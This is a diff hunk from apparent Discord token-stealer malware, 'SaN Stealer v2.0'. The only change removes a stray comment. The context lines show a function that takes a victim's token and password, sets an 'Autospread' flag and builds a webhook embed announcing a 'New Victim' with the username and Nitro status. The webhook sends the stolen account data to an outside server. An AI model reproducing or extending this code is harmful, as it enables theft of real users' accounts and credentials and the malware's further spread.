@@ -121,7 +121,6 @@ def API(token: str, message: str, password: str):
         Autospread = "True"
     else:
         Autospread = "False"
-    # hhhhhh
     webhookk = DiscordWebhook(url="WEBHOOK LINK", rate_limit_retry=True)
     un = UI["username"] + "#" + UI['discriminator']
     embed = DiscordEmbed(title='SaN Stealer v2.0 | New Victim🔔 | @everyone', description=f':arrow_forward: **User:** `{un}`\n:moneybag: **Subscription**: `{Nitro}`', color='03b2f8')
